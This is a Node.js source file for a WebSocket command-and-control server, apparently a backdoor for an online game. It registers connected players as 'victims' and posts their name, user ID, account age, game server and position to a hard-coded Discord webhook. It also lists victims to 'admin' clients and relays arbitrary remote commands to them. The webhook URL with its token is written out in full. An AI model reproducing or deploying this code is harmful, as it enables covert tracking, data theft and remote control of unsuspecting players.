const WebSocket = require('ws');
const express = require('express');
const http = require('http');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
app.use(cors());
app.use(express.json());

const clients = new Map();
const victims = new Map();
const WEBHOOK_URL = "https://discord.com/api/webhooks/1416501246587699250/USZiZoPhgaaYpyNQw2FKycVPjXuSJ9Bo7CVd-saZSGHRJczZ16d8Sh-40A_fWQMUIFF1";

function sendDiscordWebhook(playerInfo) {
    const embed = {
        title: "🎯 Новый клиент подключился",
        color: 0xFF0000,
        fields: [
            { name: "👤 Игрок", value: playerInfo.name || "Unknown", inline: true },
            { name: "🆔 User ID", value: playerInfo.userId.toString(), inline: true },
            { name: "📅 Возраст аккаунта", value: playerInfo.accountAge + " дней", inline: true },
            { name: "🎮 Место в игре", value: playerInfo.placeId || "Unknown", inline: true },
            { name: "🌐 Job ID", value: playerInfo.jobId || "Unknown", inline: true },
            { name: "📍 Позиция", value: `X: ${playerInfo.x}\nY: ${playerInfo.y}\nZ: ${playerInfo.z}`, inline: false }
        ],
        timestamp: new Date().toISOString()
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    }).catch(() => {});
}

function broadcastToAdmins(data) {
    for (let [id, client] of clients.entries()) {
        if (id.toString().startsWith("ADMIN_") && client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    }
}

wss.on('connection', ws => {
    ws.on('message', data => {
        try {
            const msg = JSON.parse(data);
            
            if (msg.type === 'register') {
                clients.set(msg.id, ws);
                victims.set(msg.id, msg);
                sendDiscordWebhook(msg);
                broadcastToAdmins({
                    type: "victim_connected",
                    ...msg
                });
                ws.send(JSON.stringify({ type: 'registered' }));
                
            } else if (msg.type === 'register_admin') {
                clients.set("ADMIN_" + Date.now(), ws);
                // Send current victims to admin
                victims.forEach(victim => {
                    ws.send(JSON.stringify({
                        type: "victim_connected",
                        ...victim
                    }));
                });
                
            } else if (msg.type === 'control') {
                const target = clients.get(msg.target);
                if (target && target.readyState === WebSocket.OPEN) {
                    target.send(JSON.stringify({ 
                        cmd: msg.cmd, 
                        args: msg.args 
                    }));
                }
            } else if (msg.type === 'get_victims') {
                victims.forEach(victim => {
                    ws.send(JSON.stringify({
                        type: "victim_connected",
                        ...victim
                    }));
                });
            }
        } catch (e) {}
    });

    ws.on('close', () => {
        for (let [id, client] of clients.entries()) {
            if (client === ws) {
                clients.delete(id);
                if (!id.toString().startsWith("ADMIN_")) {
                    victims.delete(id);
                    broadcastToAdmins({
                        type: "victim_disconnected",
                        userId: id
                    });
                }
                break;
            }
        }
    });
});

app.get('/', (req, res) => res.json({ status: 'running', clients: clients.size, victims: victims.size }));
app.get('/ping', (req, res) => res.json({ status: 'awake' }));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));
